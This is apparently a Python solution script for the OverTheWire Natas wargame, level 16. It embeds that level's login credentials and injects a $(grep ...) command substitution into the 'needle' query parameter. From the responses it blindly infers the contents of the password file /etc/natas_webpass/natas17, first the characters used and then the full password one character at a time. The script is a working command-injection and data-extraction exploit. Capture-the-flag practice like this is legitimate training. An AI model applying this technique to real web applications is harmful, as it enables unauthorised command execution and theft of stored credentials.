#! /usr/bin/python
import requests
import string

auth= requests.auth.HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')  

filteredchars = ''  
passwd = ''

for char in string.printable:  
	r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ' + char + ' /etc/natas_webpass/natas17)', auth=auth)  
	if 'doomed' not in r.text:  
		filteredchars = filteredchars + char  
		print(filteredchars)  
print("Filtered.")

for i in range(32):  
	for char in filteredchars:  
		r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ^' + passwd + char + ' /etc/natas_webpass/natas17)', auth=auth)  
    
		if 'doomed' not in r.text:  
			passwd = passwd + char  
			print(passwd)  
			break  

print("Done.")
